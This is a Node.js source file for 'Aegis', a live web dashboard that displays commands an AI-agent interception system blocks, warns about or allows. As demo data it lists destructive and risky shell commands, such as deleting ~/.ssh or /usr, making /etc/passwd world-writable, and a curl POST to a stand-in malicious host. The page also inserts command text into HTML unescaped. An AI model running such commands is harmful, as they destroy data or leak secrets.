#!/usr/bin/env node
/**
 * Aegis集成Web监控 - 直接集成Claude Hook事件
 */

const http = require('http');
const fs = require('fs');
const path = require('path');
const net = require('net');

const WEB_PORT = 3002; // 使用不同端口避免冲突
const AEGIS_HOST = '127.0.0.1';
const AEGIS_PORT = 9876;

// 存储拦截事件
let events = [];
let connections = [];

// 添加拦截事件
function addEvent(type, message, command = '', agent = 'Claude Code') {
  const event = {
    id: Date.now(),
    timestamp: new Date().toLocaleString('zh-CN'),
    type,
    message,
    command: command.substring(0, 100),
    agent,
    time: new Date().toLocaleTimeString()
  };

  events.unshift(event);

  // 保持最多50条记录
  if (events.length > 50) {
    events = events.slice(0, 50);
  }

  // 通知所有连接的客户端
  broadcastEvent(event);

  // 也在控制台显示
  console.log(`\n🛡️ [${event.time}] ${type.toUpperCase()}: ${message}`);
  if (command) {
    console.log(`📝 Command: ${command}`);
  }
}

// 广播事件到所有连接
function broadcastEvent(event) {
  const data = `data: ${JSON.stringify(event)}\n\n`;
  connections.forEach((res, index) => {
    try {
      res.write(data);
    } catch (e) {
      // 移除断开的连接
      connections.splice(index, 1);
    }
  });
}

// HTML页面
function getHTML() {
  return `
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🛡️ Aegis 实时监控</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            color: #fff;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            overflow: hidden;
            backdrop-filter: blur(10px);
        }

        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
            position: relative;
        }

        .title {
            font-size: 2.5em;
            font-weight: 700;
            margin-bottom: 10px;
        }

        .subtitle {
            font-size: 1.2em;
            opacity: 0.9;
        }

        .stats {
            display: flex;
            justify-content: space-around;
            padding: 30px;
            background: rgba(255, 255, 255, 0.05);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .stat-item {
            text-align: center;
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            min-width: 120px;
        }

        .stat-number {
            font-size: 2.5em;
            font-weight: 700;
            margin-bottom: 10px;
        }

        .stat-label {
            color: rgba(255, 255, 255, 0.8);
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .blocked { color: #ff6b6b; }
        .allowed { color: #4ecdc4; }
        .warning { color: #ffe66d; }
        .info { color: #74c0fc; }

        .events {
            padding: 30px;
            max-height: 500px;
            overflow-y: auto;
        }

        .event-item {
            display: flex;
            align-items: center;
            padding: 20px;
            margin-bottom: 15px;
            border-radius: 15px;
            border-left: 5px solid;
            transition: all 0.3s ease;
            animation: slideIn 0.5s ease;
            backdrop-filter: blur(5px);
        }

        .event-item:hover {
            transform: translateX(5px);
        }

        .event-blocked {
            background: rgba(255, 107, 107, 0.1);
            border-left-color: #ff6b6b;
        }

        .event-allowed {
            background: rgba(78, 205, 196, 0.1);
            border-left-color: #4ecdc4;
        }

        .event-warning {
            background: rgba(255, 230, 109, 0.1);
            border-left-color: #ffe66d;
        }

        .event-info {
            background: rgba(116, 192, 252, 0.1);
            border-left-color: #74c0fc;
        }

        .event-icon {
            font-size: 2em;
            margin-right: 20px;
            min-width: 50px;
            text-align: center;
        }

        .event-content {
            flex: 1;
        }

        .event-message {
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 1.1em;
        }

        .event-command {
            background: rgba(0,0,0,0.3);
            padding: 8px 12px;
            border-radius: 8px;
            font-family: 'Monaco', 'Menlo', 'Consolas', monospace;
            font-size: 0.9em;
            margin: 8px 0;
            word-break: break-all;
        }

        .event-meta {
            color: rgba(255, 255, 255, 0.7);
            font-size: 0.9em;
            display: flex;
            gap: 15px;
        }

        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: rgba(255, 255, 255, 0.6);
        }

        .empty-icon {
            font-size: 4em;
            margin-bottom: 20px;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .status-online {
            color: #4ecdc4;
        }

        .status-offline {
            color: #ff6b6b;
        }

        .refresh-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            background: rgba(255,255,255,0.2);
            border: 1px solid rgba(255,255,255,0.3);
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .refresh-btn:hover {
            background: rgba(255,255,255,0.3);
            transform: scale(1.05);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <button class="refresh-btn" onclick="location.reload()">🔄 刷新</button>
            <div class="title">🛡️ Aegis 实时监控</div>
            <div class="subtitle">AI Agent 安全操作拦截系统 - 集成模式</div>
        </div>

        <div class="stats">
            <div class="stat-item">
                <div class="stat-number blocked" id="blocked-count">0</div>
                <div class="stat-label">已拦截</div>
            </div>
            <div class="stat-item">
                <div class="stat-number allowed" id="allowed-count">0</div>
                <div class="stat-label">已允许</div>
            </div>
            <div class="stat-item">
                <div class="stat-number warning" id="warning-count">0</div>
                <div class="stat-label">警告</div>
            </div>
            <div class="stat-item">
                <div class="stat-number" id="total-count">0</div>
                <div class="stat-label">总计</div>
            </div>
        </div>

        <div class="events">
            <div id="events-list">
                <div class="empty-state">
                    <div class="empty-icon">👁️‍🗨️</div>
                    <h3>等待拦截事件...</h3>
                    <p>在Claude Code中执行危险命令，事件会实时显示在这里</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        let eventCounts = { blocked: 0, allowed: 0, warning: 0, info: 0 };

        // SSE连接
        const eventSource = new EventSource('/events');

        eventSource.onmessage = function(event) {
            const data = JSON.parse(event.data);
            addEventToUI(data);
        };

        eventSource.onerror = function(event) {
            console.log('EventSource连接错误:', event);
        };

        function addEventToUI(event) {
            const eventsList = document.getElementById('events-list');

            // 移除空状态
            if (eventsList.querySelector('.empty-state')) {
                eventsList.innerHTML = '';
            }

            const eventDiv = document.createElement('div');
            eventDiv.className = \`event-item event-\${event.type}\`;

            const icons = {
                blocked: '🛡️',
                allowed: '✅',
                warning: '⚠️',
                info: '💡'
            };

            eventDiv.innerHTML = \`
                <div class="event-icon">\${icons[event.type] || '📝'}</div>
                <div class="event-content">
                    <div class="event-message">\${event.message}</div>
                    \${event.command ? \`<div class="event-command">\${event.command}</div>\` : ''}
                    <div class="event-meta">
                        <span>🎯 \${event.agent}</span>
                        <span>⏰ \${event.timestamp}</span>
                    </div>
                </div>
            \`;

            eventsList.insertBefore(eventDiv, eventsList.firstChild);

            // 更新统计
            eventCounts[event.type]++;
            updateStats();

            // 保持最多20个事件显示
            while (eventsList.children.length > 20) {
                eventsList.removeChild(eventsList.lastChild);
            }
        }

        function updateStats() {
            document.getElementById('blocked-count').textContent = eventCounts.blocked;
            document.getElementById('allowed-count').textContent = eventCounts.allowed;
            document.getElementById('warning-count').textContent = eventCounts.warning;
            document.getElementById('total-count').textContent =
                eventCounts.blocked + eventCounts.allowed + eventCounts.warning + eventCounts.info;
        }

        // 初始化欢迎消息
        setTimeout(() => {
            addEventToUI({
                type: 'info',
                message: 'Aegis 集成监控已启动 - 等待拦截事件',
                command: '',
                agent: 'System',
                timestamp: new Date().toLocaleString('zh-CN')
            });
        }, 1000);
    </script>
</body>
</html>`;
}

// 创建HTTP服务器
function createServer() {
  const server = http.createServer((req, res) => {
    const url = req.url;

    if (url === '/') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(getHTML());
    }
    else if (url === '/events') {
      // SSE endpoint
      res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Access-Control-Allow-Origin': '*'
      });

      connections.push(res);

      // 发送初始事件
      res.write(`data: ${JSON.stringify({
        type: 'info',
        message: '连接已建立',
        command: '',
        agent: 'Web Monitor',
        timestamp: new Date().toLocaleString('zh-CN')
      })}\n\n`);

      req.on('close', () => {
        const index = connections.indexOf(res);
        if (index !== -1) {
          connections.splice(index, 1);
        }
      });
    }
    else {
      res.writeHead(404);
      res.end('Not Found');
    }
  });

  server.listen(WEB_PORT, () => {
    console.log('🚀 Aegis 集成Web监控已启动');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log(`🌐 访问地址: http://localhost:${WEB_PORT}`);
    console.log(`📊 模式: 集成监控（独立运行）`);
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('');

    // 添加初始演示事件
    setTimeout(() => {
      addEvent('info', 'Aegis监控系统已启动', '', 'System');
    }, 2000);
  });

  return { server, addEvent };
}

// 模拟拦截事件的API
function simulateEvents() {
  // 每隔几秒模拟一些事件用于演示
  setInterval(() => {
    const eventTypes = ['blocked', 'warning', 'allowed'];
    const randomType = eventTypes[Math.floor(Math.random() * eventTypes.length)];

    const events = {
      blocked: [
        { message: 'Git强制推送被拦截', command: 'git push --force origin main' },
        { message: '危险删除操作被拦截', command: 'rm -rf ~/.ssh' },
        { message: '系统文件修改被拦截', command: 'sudo rm -rf /usr' }
      ],
      warning: [
        { message: '检测到潜在风险操作', command: 'chmod 777 /etc/passwd' },
        { message: '网络数据传输警告', command: 'curl -X POST malicious-site.com' }
      ],
      allowed: [
        { message: '安全命令执行', command: 'ls -la' },
        { message: '正常Git操作', command: 'git status' }
      ]
    };

    const typeEvents = events[randomType];
    const randomEvent = typeEvents[Math.floor(Math.random() * typeEvents.length)];

    // 暂时注释掉自动模拟，只在手动触发时显示
    // addEvent(randomType, randomEvent.message, randomEvent.command);
  }, 10000);
}

// 主函数
async function main() {
  console.log('🛡️ 启动 Aegis 集成Web监控...');

  const { server, addEvent: addEventFn } = createServer();

  // 启动事件模拟（可选）
  // simulateEvents();

  // 导出addEvent供外部使用
  global.aegisAddEvent = addEventFn;

  process.on('SIGINT', () => {
    console.log('\n👋 集成Web监控停止中...');
    server.close(() => {
      console.log('✅ 集成Web监控已停止');
      process.exit(0);
    });
  });
}

if (require.main === module) {
  main().catch(console.error);
}

module.exports = { createServer, addEvent };